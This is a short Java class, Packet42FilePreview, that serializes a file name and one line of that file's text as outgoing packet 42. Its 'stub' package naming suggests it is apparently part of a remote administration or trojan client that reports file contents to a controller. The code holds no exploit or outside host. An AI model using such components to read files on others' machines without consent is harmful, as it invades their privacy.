package com.redpois0n.stub.packets.outgoing;

import java.io.DataOutputStream;

import com.redpois0n.common.io.StringWriter;

public class Packet42FilePreview extends AbstractOutgoingPacket {
	
	private String file;
	private String line;
	
	public Packet42FilePreview(String file, String line) {
		this.file = file;
		this.line = line;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		sw.writeLine(file);
		sw.writeLine(line);
	}

	@Override
	public byte getPacketId() {
		return 42;
	}

}
